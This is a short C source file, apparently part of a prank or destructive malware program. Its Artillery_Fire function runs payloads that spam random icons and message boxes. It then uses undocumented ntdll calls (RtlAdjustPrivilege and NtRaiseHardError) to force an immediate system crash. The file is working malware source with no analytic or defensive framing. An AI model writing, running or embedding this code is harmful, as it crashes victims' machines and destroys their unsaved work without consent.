#include "watchdog.h"

void Artillery_Fire()
{
	RunPayload(payload_randomicon, NULL);
	RunPayload(payload_messageboxes, NULL);
	
	HMODULE Hdll = LoadLibraryA("ntdll");
	FARPROC RtlAdjustPrivilege_Func = GetProcAddress(Hdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardError_Func = GetProcAddress(Hdll, "NtRaiseHardError");

	if (RtlAdjustPrivilege_Func != NULL && NtRaiseHardError_Func != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege_Func)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError_Func)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}
}
